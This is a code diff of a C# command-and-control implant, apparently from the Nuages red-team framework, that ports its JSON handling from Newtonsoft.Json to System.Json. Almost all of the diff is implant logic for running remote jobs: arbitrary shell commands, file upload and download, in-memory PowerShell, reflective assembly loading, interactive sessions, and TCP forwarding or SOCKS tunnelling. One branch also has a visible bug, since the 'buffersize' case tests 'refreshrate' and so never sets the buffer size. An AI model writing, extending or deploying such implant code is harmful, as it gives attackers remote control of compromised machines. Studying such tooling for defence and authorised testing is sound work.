@@ -2,13 +2,13 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
-using Newtonsoft.Json.Linq;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Text;
 using System.Collections.ObjectModel;
 using System.Reflection;
 using System.Net.Sockets;
+using System.Json;
 
 namespace NuagesSharpImplant
 {
@@ -26,7 +26,7 @@ namespace NuagesSharpImplant
         private NuagesC2Connector connector;
         private Dictionary<string, Assembly> assemblies;
         String[] supportedPayloads;
-        JArray jobs;
+        JsonArray jobs;
 
         public string GetLocalIPv4()
         {
@@ -44,7 +44,7 @@ namespace NuagesSharpImplant
 
         public NuagesC2Implant(Dictionary<string, string> config, NuagesC2Connector connector)
         {
-            this.jobs = new JArray();
+            this.jobs = new JsonArray();
 
             this.config = config;
 
@@ -172,19 +172,19 @@ namespace NuagesSharpImplant
             }
         }
        
-        public void ExecuteJob(JObject job)
+        public void ExecuteJob(JsonObject job)
         {
-            string jobId = job.GetValue("_id").ToString();
+            string jobId = job["_id"];
             try
             {
-                string jobType = job.SelectToken("payload.type").ToString();
+                string jobType = job["payload"]["type"];
                 if (jobType == "command")
                 {
-                    string cmd = job.SelectToken("payload.options.cmd").ToString();
+                    string cmd = job["payload"]["options"]["cmd"];
                     string path = ".";
                     try
                     {
-                        path = job.SelectToken("payload.options.path").ToString();
+                        path = job["payload"]["options"]["path"];
                     }
                     catch { }
                     Directory.SetCurrentDirectory(path);
@@ -205,11 +205,11 @@ namespace NuagesSharpImplant
                 }
                 else if (jobType == "cd")
                 {
-                    string dir = job.SelectToken("payload.options.dir").ToString();
+                    string dir = job["payload"]["options"]["dir"];
                     string path = ".";
                     try
                     {
-                        path = job.SelectToken("payload.options.path").ToString();
+                        path = job["payload"]["options"]["path"];
                     }
                     catch { }
                     Directory.SetCurrentDirectory(path);
@@ -222,25 +222,29 @@ namespace NuagesSharpImplant
                 }
                 else if (jobType == "configure")
                 {
-                    JObject config = (JObject)job.SelectToken("payload.options.config");
-                    foreach (var x in config)
+                    JsonValue config = job["payload"]["options"]["config"];
+                    foreach (KeyValuePair<string, JsonValue> x in config)
                     {
-                        this.config[x.Key] = x.Value.ToString();
-                        if (x.Key == "refreshrate")
-                        {
-                            this.connector.setRefreshRate(int.Parse(x.Value.ToString()));
+                       this.config[x.Key] = x.Value;
+                       if (x.Key == "refreshrate")
+                       {
+                            this.connector.setRefreshRate(int.Parse(x.Value));
                         }
                         else if (x.Key == "buffersize") {
-
+                        
                             if (x.Key == "refreshrate")
                             {
-                                this.connector.setBufferSize(int.Parse(x.Value.ToString()));
+                                this.connector.setBufferSize(int.Parse(x.Value));
                             }
-
                         }
                     }
-
-                    SubmitJobResult(jobId, Newtonsoft.Json.JsonConvert.SerializeObject(this.config), false);
+                    List<KeyValuePair<string, JsonValue>> configList = new List<KeyValuePair<string, JsonValue>>();
+                    foreach (KeyValuePair<string, string> p in this.config)
+                    {
+                        configList.Add(new KeyValuePair<string, JsonValue>(p.Key, p.Value));
+                    }
+                    JsonObject configObject = new JsonObject(configList);
+                    SubmitJobResult(jobId, configObject.ToString(), false);
                 }
                 else if (jobType == "exit")
                 {
@@ -252,13 +256,13 @@ namespace NuagesSharpImplant
                     string path = ".";
                     try
                     {
-                        path = job.SelectToken("payload.options.path").ToString();
+                        path = job["payload"]["options"]["path"];
                     }
                     catch { }
                     Directory.SetCurrentDirectory(path);
-                    string file = job.SelectToken("payload.options.file").ToString();
-                    string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
-                    int length = job.SelectToken("payload.options.length").ToObject<int>();
+                    string file = job["payload"]["options"]["file"];
+                    string pipe_id = job["payload"]["options"]["pipe_id"];
+                    int length = (int)job["payload"]["options"]["length"];
                     string result = "";
                     using (FileStream fs = new FileStream(file, System.IO.FileMode.Create))
                     {
@@ -272,12 +276,12 @@ namespace NuagesSharpImplant
                     string path = ".";
                     try
                     {
-                        path = job.SelectToken("payload.options.path").ToString();
+                        path = job["payload"]["options"]["path"];
                     }
                     catch { }
                     Directory.SetCurrentDirectory(path);
-                    string file = job.SelectToken("payload.options.file").ToString();
-                    string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
+                    string file = job["payload"]["options"]["file"];
+                    string pipe_id = job["payload"]["options"]["pipe_id"];
                     string result = "";
                     using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                     {
@@ -288,22 +292,22 @@ namespace NuagesSharpImplant
                 }
                 else if (jobType == "posh_in_mem")
                 {
-                    string command = job.SelectToken("payload.options.command").ToString();
+                    string command = job["payload"]["options"]["command"];
                     string path = ".";
                     string pipe_id;
                     string script;
                     int length = 0;
                     try
                     {
-                        length = job.SelectToken("payload.options.length").ToObject<int>();
-                        pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
+                        length = (int)job["payload"]["options"]["length"];
+                        pipe_id = job["payload"]["options"]["pipe_id"];
                     }
                     catch {
                         pipe_id = "";
                     }
                     try
                     {
-                        path = job.SelectToken("payload.options.path").ToString();
+                        path = job["payload"]["options"]["path"];
                     }
                     catch { }
                     Directory.SetCurrentDirectory(path);
@@ -321,12 +325,12 @@ namespace NuagesSharpImplant
                 }
                 else if (jobType == "reflected_assembly")
                 {
-                    string arguments = job.SelectToken("payload.options.arguments").ToString();
-                    string method = job.SelectToken("payload.options.method").ToString();
-                    string clas = job.SelectToken("payload.options.class").ToString();
-                    string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
-                    int length = job.SelectToken("payload.options.length").ToObject<int>();
-                    string file_id = job.SelectToken("payload.options.file_id").ToString();
+                    string arguments = job["payload"]["options"]["arguments"];
+                    string method = job["payload"]["options"]["method"];
+                    string clas = job["payload"]["options"]["class"];
+                    string pipe_id = job["payload"]["options"]["pipe_id"];
+                    int length = (int)job["payload"]["options"]["length"];
+                    string file_id = job["payload"]["options"]["file_id"];
                     Assembly assembly;
                     string[] strarr = arguments.Split(',');
                     string result = "";
@@ -357,12 +361,12 @@ namespace NuagesSharpImplant
                 }
                 else if (jobType == "interactive")
                 {
-                    string filename = job.SelectToken("payload.options.filename").ToString();
-                    string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
+                    string filename = job["payload"]["options"]["filename"];
+                    string pipe_id = job["payload"]["options"]["pipe_id"];
                     string path = ".";
                     try
                     {
-                        path = job.SelectToken("payload.options.path").ToString();
+                        path = job["payload"]["options"]["path"];
                     }
                     catch { }
                     Directory.SetCurrentDirectory(path);
@@ -417,11 +421,11 @@ namespace NuagesSharpImplant
                 else if (jobType == "tcp_fwd" || jobType == "socks")
                 {
                     TcpClient tcpClient = new TcpClient();
-                    string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
+                    string pipe_id = job["payload"]["options"]["pipe_id"];
                     if (jobType == "tcp_fwd")
                     {
-                        string host = job.SelectToken("payload.options.host").ToString();
-                        int port = job.SelectToken("payload.options.port").ToObject<int>();
+                        string host = job["payload"]["options"]["host"];
+                        int port = (int)job["payload"]["options"]["port"];
                         IPAddress ipAddress = getIpAddress(host);
                         tcpClient.Connect(ipAddress, port);
 
@@ -629,9 +633,9 @@ namespace NuagesSharpImplant
                     }
                     System.Threading.Thread.Sleep(sleep);
                     this.Heartbeat();
-                    foreach (JObject job in this.jobs)
+                    foreach (JsonValue job in this.jobs)
                     {
-                        System.Threading.Thread thread = new System.Threading.Thread(() => this.ExecuteJob(job));
+                        System.Threading.Thread thread = new System.Threading.Thread(() => this.ExecuteJob((JsonObject)job));
                         thread.Start();
                     }
                 }
